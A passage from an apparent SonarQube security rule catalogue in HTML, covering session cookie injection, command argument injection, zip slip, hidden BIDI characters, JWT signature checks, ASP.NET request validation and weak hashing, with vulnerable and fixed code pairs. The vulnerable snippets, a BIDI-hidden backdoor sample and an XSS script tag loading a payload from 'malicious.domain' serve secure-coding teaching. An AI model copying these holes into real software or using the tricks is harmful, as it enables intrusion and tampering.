<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<h4>Do not use path.resolve as a validator</h4>
<p>The <a href="https://nodejs.org/api/path.html#pathresolvepaths">official documentation</a> states that if any argument other than the first is an
absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6287">
              tssecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a
href="https://example.com?cookie=injectedcookie">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import express from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(cookieParser());

app.get("/checkcookie", (req, res) =&gt; {
    if (req.cookies["connect.sid"] === undefined) {
        const cookie = req.query.cookie;
        res.cookie("connect.sid", cookie); // Noncompliant
    }

    return res.redirect("/welcome");
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import express from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(cookieParser());

app.get("/checkcookie", (req, res) =&gt; {
    if (req.cookies["connect.sid"] === undefined) {
        return res.redirect("/getcookie");
    }

    return res.redirect("/welcome");
});
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6350">
              tssecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920">CVE-2016-9920</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472">CVE-2021-29472</a> </li>
</ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Malicious arguments can result in undesired behavior in the executed command. </li>
  <li> Passing user input to a system command is not necessary. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid constructing system commands from user input when possible. </li>
  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>
  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
const { spawn } = require("child_process");
const input = req.query.input;
const proc = spawn("/usr/bin/find", [input]); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
const { spawn } = require("child_process");
const input = req.query.input;
if (allowed.includes(input)) {
  const proc = spawn("/usr/bin/find", [input]);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S6096">
              tssecurity:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const AdmZip = require("adm-zip");
const upload = require('multer');

app.get('/example', upload.single('file'), (req, res) =&gt; {
    const zip = new AdmZip(req.file.buffer);
    const zipEntries = zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        var writer = fs.createWriteStream(zipEntry.entryName); // Noncompliant
        writer.write(zipEntry.getData().toString("utf8"));
    });
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const AdmZip = require("adm-zip");
const upload = require('multer');

const unzipTargetDir = "/example/directory/";

app.get('/example', upload.single('file'), (req, res) =&gt; {
    const zip = new AdmZip(req.file.buffer);
    const zipEntries = zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        const canonicalPath = path.normalize(unzipTargetDir + zipEntry.entryName);
        if (canonicalPath.startsWith(unzipTargetDir)) {
            let writer = fs.createWriteStream(canonicalPath);
            writer.write(zipEntry.getData().toString("utf8"));
        }
    });
});
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol>
  <li> Resolve the canonical path of the file by using methods like <code>path.join</code> or <code>path.normalize</code>. This will resolve relative
  path or path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>
</ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string variable <code>targetDirectory</code> does not end
with a path separator:</p>
<pre>
const AdmZip = require("adm-zip");

const targetDirectory = "/Users/John";

app.get('/example', (req, res) =&gt; {
    const canonicalPath = path.normalize(targetDirectory + req.query.filename)

    if (canonicalPath.startsWith(targetDirectory)) {
        const zip = new AdmZip(canonicalPath);
	    const zipEntries = zip.getEntries();

    	zipEntries.forEach(function (zipEntry) {
            var writer = fs.createWriteStream(zipEntry.entryName);
            writer.write(zipEntry.getData().toString("utf8"));
	    });
    }
});
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/advisories/GHSA-xwg4-93c6-3h42">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://snyk.io/research/zip-slip-vulnerability">snyk</a> - Zip Slip Vulnerability </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=text:S6389">
              text:S6389
            </a>
          </td>
          <td>
            <details>
              <p>Using bidirectional (BIDI) characters can lead to incomprehensible code.</p>
<p>The Unicode encoding contains BIDI control characters that are used to display text right-to-left (RTL) instead of left-to-right (LTR). This is
necessary for certain languages that use RTL text. The BIDI characters can be used to create a difference in the code between what a human sees and
what a compiler or interpreter sees. An advisary might use this feature to hide a backdoor in the code that will not be spotted by a human reviewer as
it is not visible.</p>
<p>This can lead to supply chain attacks since the backdoored code might persist over a long time without being detected and can even be included in
other projects, for example in the case of libraries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This text requires a right-to-left writing system (to use Arabic or Hebrew words, for example). </li>
  <li> The author of this text is a legitimate user. </li>
  <li> This text contains a standard instruction, comment or sequence of characters. </li>
</ul>
<p>There is a risk if you answered no to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Open the file in an editor that reveals non-ASCII characters and remove all BIDI control characters that are not intended.</p>
<p>If hidden characters are illegitimate, this issue could indicate a potential ongoing attack on the code. Therefore, it would be best to warn your
organization’s security team about this issue.</p>
<p>Required opening BIDI characters should be explicitly closed with the PDI character.</p>
<h2>Sensitive Code Example</h2>
<p>A hidden BIDI character is present in front of <code>return</code>:</p>
<pre>
def subtract_funds(account: str, amount: int):
    ''' Subtract funds from bank account then ⁧''' ;return
    bank[account] -= amount
    return
</pre>
<p>The executed code looks like the following:</p>
<pre>
def subtract_funds(account: str, amount: int):
    ''' Subtract funds from bank account then &lt;RLI&gt;''' ;return
    bank[account] -= amount
    return
</pre>
<h2>Compliant Solution</h2>
<p>No hidden BIDI characters are present:</p>
<pre>
def subtract_funds(account: str, amount: int):
    ''' Subtract funds from bank account then return; '''
    bank[account] -= amount
    return
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://unicode.org/reports/tr9/">Bidirectional Algorithm</a> - Unicode Standard </li>
  <li> <a href="https://en.wikipedia.org/wiki/Bidirectional_text">Wikipedia</a> - Bidirectional Text </li>
  <li> <a href="https://www.trojansource.codes/trojan-source.pdf">Trojan Source Report</a> </li>
  <li> <a href="https://www.trojansource.codes/trojan-source.pdf#page=15">Trojan Source Report</a> - IDEs revealing hidden characters </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/94">CWE-94 - Improper Control of Generation of Code ('Code Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4507">
              vbnet:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>If env.IsDevelopment()</code> to disable debug code.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>.</p>
<pre>
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting

Namespace MyMvcApp
    Public Class Startup
        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)
            ' Those calls are Sensitive because it seems that they will run in production
            app.UseDeveloperExceptionPage() 'Sensitive
            app.UseDatabaseErrorPage() 'Sensitive
        End Sub
    End Class
End Namespace
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting

Namespace MyMvcApp
    Public Class Startup
        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)
            If env.IsDevelopment() Then ' Compliant
                ' The following calls are ok because they are disabled in production
                app.UseDeveloperExceptionPage()
                app.UseDatabaseErrorPage()
            End If
        End Sub
    End Class
End Namespace
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5659">
              vbnet:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in Jwt.Net</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports JWT

Public Sub Decode(decoder AS IJwtDecoder)
    Dim decoded As String = decoder.Decode(token, secret, verify:= false) ' Noncompliant
End Sub
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
Imports JWT

Public Sub Decode()
    Dim decoded As String = new JwtBuilder()
        .WithSecret(secret)
        .Decode(token) ' Noncompliant
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports JWT

Public Sub Decode(decoder AS IJwtDecoder)
    Dim decoded As String = decoder.Decode(token, secret, verify:= true)
End Sub
</pre>
<p>When using <code>JwtBuilder</code>, make sure to call <code>MustVerifySignature()</code>.</p>
<pre data-diff-id="2" data-diff-type="compliant">
Imports JWT

Public Sub Decode()
    Dim decoded As String = new JwtBuilder()
        .WithSecret(secret)
        .MustVerifySignature()
        .Decode(token)
End Sub
</pre>
<h3>How does this work?</h3>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue, follow these instructions:</p>
<ol>
  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>
  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for
  further investigation. </li>
  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>
</ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5753">
              vbnet:S5753
            </a>
          </td>
          <td>
            <details>
              <p>ASP.NET 1.1+ comes with a feature called <em>Request Validation</em>, preventing the server to accept content containing un-encoded HTML. This
feature comes as a first protection layer against Cross-Site Scripting (XSS) attacks and act as a simple Web Application Firewall (WAF) rejecting
requests potentially containing malicious content.</p>
<p>While this feature is not a silver bullet to prevent all XSS attacks, it helps to catch basic ones. It will for example prevent <code>&lt;script
type="text/javascript" src="https://malicious.domain/payload.js"&gt;</code> to reach your Controller.</p>
<p>Note: <em>Request Validation</em> feature being only available for ASP.NET, no Security Hotspot is raised on ASP.NET Core applications.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the developer doesn’t know the impact to deactivate the Request Validation feature </li>
  <li> the web application accepts user-supplied data </li>
  <li> all user-supplied data are not validated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Activate the Request Validation feature for all HTTP requests </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>At Controller level:</p>
<pre>
&lt;ValidateInput(False)&gt;
Public Function Welcome(Name As String) As ActionResult
  ...
End Function
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest="false" /&gt;
      ...
      &lt;httpRuntime requestValidationMode="0.0" /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<p>At Controller level:</p>
<pre>
&lt;ValidateInput(True)&gt;
Public Function Welcome(Name As String) As ActionResult
  ...
End Function
</pre>
<p>or</p>
<pre>
Public Function Welcome(Name As String) As ActionResult
  ...
End Function
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest="true" /&gt;
      ...
      &lt;httpRuntime requestValidationMode="4.5" /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpruntimesection.requestvalidationmode?view=netframework-4.8">HttpRuntimeSection.RequestValidationMode Property</a> </li>
  <li> <a href="https://owasp.org/www-community/ASP-NET_Request_Validation">OWASP ASP.NET Request Validation</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2257">
              vbnet:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>AES</code>, <code>RSA</code>, <code>SHA</code>, …​ should be used instead.</p>
<p>This rule tracks custom implementation of these types from <code>System.Security.Cryptography</code> namespace:</p>
<ul>
  <li> <code>AsymmetricAlgorithm</code> </li>
  <li> <code>AsymmetricKeyExchangeDeformatter</code> </li>
  <li> <code>AsymmetricKeyExchangeFormatter</code> </li>
  <li> <code>AsymmetricSignatureDeformatter</code> </li>
  <li> <code>AsymmetricSignatureFormatter</code> </li>
  <li> <code>DeriveBytes</code> </li>
  <li> <code>HashAlgorithm</code> </li>
  <li> <code>ICryptoTransform</code> </li>
  <li> <code>SymmetricAlgorithm</code> </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a standard algorithm instead of creating a custom one. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Public Class CustomHash     ' Noncompliant
    Inherits HashAlgorithm

    Private fResult() As Byte

    Public Overrides Sub Initialize()
        fResult = Nothing
    End Sub

    Protected Overrides Function HashFinal() As Byte()
        Return fResult
    End Function

    Protected Overrides Sub HashCore(array() As Byte, ibStart As Integer, cbSize As Integer)
        fResult = If(fResult, array.Take(8).ToArray)
    End Sub

End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim mySHA256 As SHA256 = SHA256.Create()
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST">MessageDigest is Custom</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4790">
              vbnet:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
Imports System.Security.Cryptography

Sub ComputeHash()

    ' Review all instantiations of classes that inherit from HashAlgorithm, for example:
    Dim hashAlgo As HashAlgorithm = HashAlgorithm.Create() ' Sensitive
    Dim hashAlgo2 As HashAlgorithm = HashAlgorithm.Create("SHA1") ' Sensitive
    Dim sha As SHA1 = New SHA1CryptoServiceProvider() ' Sensitive
    Dim md5 As MD5 = New MD5CryptoServiceProvider() ' Sensitive

    ' ...
End Sub

Class MyHashAlgorithm
    Inherits HashAlgorithm ' Sensitive

    ' ...
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System.Security.Cryptography

Sub ComputeHash()
    Dim sha256 = New SHA256CryptoServiceProvider() ' Compliant
    Dim sha384 = New SHA384CryptoServiceProvider() ' Compliant
    Dim sha512 = New SHA512CryptoServiceProvider() ' Compliant

    ' ...
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
